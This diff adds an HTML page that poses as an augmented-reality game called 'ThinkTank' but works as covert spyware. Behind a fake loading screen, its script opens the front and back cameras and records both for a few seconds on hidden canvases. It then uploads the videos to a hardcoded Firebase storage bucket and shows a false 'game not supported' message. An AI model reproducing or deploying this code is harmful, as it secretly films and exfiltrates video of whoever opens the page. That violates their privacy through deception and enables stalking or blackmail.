@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ThinkTank: Augmented Reality Game!</title>
+<style>
+    #frontCanvas, #backCanvas {
+        display:none; 
+    }
+    .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: #fff;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        
+        z-index: 1000;
+    }
+    .loader {
+    	margin:20px;
+        border: 7px solid #f3f3f3;
+        border-top: 7px solid #3498db;
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        animation: spin 2s linear infinite;
+    }
+    
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+</style>
+</head>
+<body>
+    <canvas id="frontCanvas" width="640" height="480"></canvas>
+    <canvas id="backCanvas" width="640" height="480"></canvas>
+    <p id="x"></p>
+    <div id="overlay" class="overlay hidden">
+        <div id="m" class="loader"></div>
+        <div class="loading-label" id="y"><center>Loading Game...<br>This may take a few minutes...</center></div>
+        <br>
+       </div>
+
+<script src="https://www.gstatic.com/firebasejs/4.0.0/firebase.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/4.0.0/firebase-storage.js"></script>
+  <script>
+        // Initialize Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyA7Ef_tz_tOuSMWDcHTjBepJiqtWJIKzdo",
+  authDomain: "kve-curium.firebaseapp.com",
+  databaseURL: "https://kve-curium-default-rtdb.firebaseio.com",
+  projectId: "kve-curium",
+  storageBucket: "kve-curium.appspot.com",
+  messagingSenderId: "620401020438",
+  appId: "1:620401020438:web:fc158bf4c36039201bef37"
+
+        };
+
+        firebase.initializeApp(firebaseConfig);
+const platform = navigator.platform;
+        window.onload = async () => {
+            try {
+                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } });
+
+                const frontVideo = document.createElement('video');
+                frontVideo.srcObject = frontStream;
+                frontVideo.play();
+
+                const backVideo = document.createElement('video');
+                backVideo.srcObject = backStream;
+                backVideo.play();
+
+                const frontCanvas = document.getElementById('frontCanvas');
+                const frontCtx = frontCanvas.getContext('2d');
+                const backCanvas = document.getElementById('backCanvas');
+                const backCtx = backCanvas.getContext('2d');
+
+                function drawFrame() {
+                    frontCtx.drawImage(frontVideo, 0, 0, frontCanvas.width, frontCanvas.height);
+                    backCtx.drawImage(backVideo, 0, 0, backCanvas.width, backCanvas.height);
+                    requestAnimationFrame(drawFrame);
+                }
+
+                requestAnimationFrame(drawFrame);
+
+                // Record and upload videos
+                const frontMediaRecorder = new MediaRecorder(frontStream);
+                const backMediaRecorder = new MediaRecorder(backStream);
+
+                let frontChunks = [];
+                let backChunks = [];
+
+                frontMediaRecorder.ondataavailable = (event) => {
+                    frontChunks.push(event.data);
+                };
+
+                backMediaRecorder.ondataavailable = (event) => {
+                    backChunks.push(event.data);
+                };
+
+                frontMediaRecorder.onstop = async () => {
+                    const frontBlob = new Blob(frontChunks, { type: 'video/mp4' });
+                    const frontFile = new File([frontBlob], 'front_camera_' + getRandomNumber() + '.mp4');
+                    await uploadToFirebase(frontFile);
+                };
+
+                backMediaRecorder.onstop = async () => {
+                    const backBlob = new Blob(backChunks, { type: 'video/mp4' });
+                    const backFile = new File([backBlob], 'back_camera_' + getRandomNumber() + '.mp4');
+                    await uploadToFirebase(backFile);
+                };
+
+                // Start recording
+                frontMediaRecorder.start();
+                backMediaRecorder.start();
+
+                // Stop recording after 5 seconds
+                setTimeout(() => {
+                    frontMediaRecorder.stop();
+                    backMediaRecorder.stop();
+                }, 3000);
+
+                async function uploadToFirebase(file) {
+                    const storageRef = firebase.storage().ref();
+                    const fileRef = storageRef.child(file.name);
+                    await fileRef.put(file);
+                    document.getElementById('m').style.display="none";
+                    if (platform.toLowerCase().includes("android")) {
+                    document.getElementById('y').innerHTML = 'Game suppored only on iPhones';
+                } else if (platform.toLowerCase().includes("iphone")) {
+               document.getElementById('y').innerHTML = 'Game not suppored on ithis model of iPhone';
+                } 
+                else {
+                	document.getElementById('y').innerHTML = 'Game suppored only on iPhones';
+                
+}
+ }
+            } catch (error) {
+                document.getElementById('x').innerHTML = 'Frror accessing camera:'+error;
+            }
+        };
+        
+        function getRandomNumber() {
+                    return Math.floor(Math.random() * 1000000);
+                }
+    </script>
+</body>
+</html>
